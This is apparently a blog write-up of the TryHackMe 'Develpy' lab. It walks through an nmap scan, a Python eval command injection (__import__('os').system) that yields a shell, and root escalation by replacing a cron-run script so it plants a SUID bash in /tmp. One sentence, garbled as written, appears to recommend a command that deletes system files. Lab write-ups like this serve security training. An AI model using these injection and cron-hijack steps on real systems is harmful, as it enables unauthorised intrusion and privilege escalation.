---
title: "TryHackMe - Develpy"
author: Nasrallah
description: ""
date: 2023-03-05 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, easy, python, commandinjection, cronjob]
img_path: /assets/img/tryhackme/develpy
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---

# **Description**

Hello hackers, I hope you are doing well. We are doing [Develpy](https://tryhackme.com/room/) from [TryHackMe](https://tryhackme.com). This is an easy machine although it is rated medium. We find a python script listening on a high port which accepts input from us. We exploit that by injecting commands and getting a foothold. Once on the machine we find a multiple cronjobs running making easy for is to get root.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.


```terminal
Nmap scan report for 10.10.102.231                                                                                                                            
Host is up (0.096s latency).                                                                                                                                  
Not shown: 998 closed tcp ports (reset)                                                                                                                       
PORT      STATE SERVICE           VERSION                                                                                                                     
22/tcp    open  ssh               OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)                                                                
| ssh-hostkey:                                                                                                                                                
|   2048 78c44084f442138e79f86be46dbfd446 (RSA)                                                                                                               
|   256 259df329a2624b24f28336cfa775bb66 (ECDSA)                                                                                                              
|_  256 e7a007b0b9cb74e9d6167d7a67fec11d (ED25519)                                                                                                            
10000/tcp open  snet-sensor-mgmt?                                              
| fingerprint-strings:                                                         
|   GenericLines:                                                              
|     Private 0days                                                            
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>                            
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 0                                                  
|     SyntaxError: unexpected EOF while parsing                           
|   GetRequest:                                                                
|     Private 0days                                                            
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>                            
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>                                
|     NameError: name 'GET' is not defined                                
|   HTTPOptions, RTSPRequest:                                                  
|     Private 0days                                                            
|     Please enther number of exploits to send??: Traceback (most recent call last):
|     File "./exploit.py", line 6, in <module>                            
|     num_exploits = int(input(' Please enther number of exploits to send??: '))
|     File "<string>", line 1, in <module>                                
|     NameError: name 'OPTIONS' is not defined
```

We found two open ports, 22 running SSH as usual and port 10000 is a python script called `exploit.py`.

Let's connect to the port 10000 using netcat.

![](1.png)

The script asks us to enter a number then proceeds to do what looks like to me a ping to localhost.

# **Foothold**

Searching for `python command injection`, i found this [article](https://www.stackhawk.com/blog/command-injection-python/) showcasing how to do so.

![](3.png)

With the payload `__import__('os').system("{command}")`, we can run system commands. The command shown in the article is harmful and recommend you try it because it will delete the system files.

To try if the payload works, we can try running the command `sleep 10` for example and see if the target responds to it by waiting 10 seconds before running the rest of `exploit.py`.

Trying that we indeed see that the script is vulnerable to command injection.

To get a shell, we can enter the following payload that would run `/bin/bash`

```python
__import__('os').system("bash")
```

![](2.png)

Great! We got a shell as user `king`.

# **Privilege Escalation**

On king's home directory two shell file.

![](4.png)

The `run.sh` file seems to kill the listening process for `exploit.py` then runs the same listener again.

the `root.sh` is executing python scrips in `/root/company/media/` directory.

There must be a cronjob on the system that's running those files, let's check

![](5.png)

Indeed there is a cronjob, and we see that root.sh is run by root and that's the file we'll exploit to get a root shell.

First we need remove the root.sh file since it is owned by root and we can't write to it.

```bash
mv root.sh root.sh.bak
```

Now we create a malicious `root.sh` that would make a copy of /bin/bash with suid bit set in the /tmp directory.

```bash
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > root.sh && chmod +x root.sh
```

Now we wait a bit for the cronjob to run and check the /tmp directory.

![](6.png)

Now we execute `/tmp/bash -p` to get a root shell.

```bash
king@ubuntu:~$ /tmp/bash -p
bash: cannot set terminal process group (748): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.3# whoami
root
```

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---
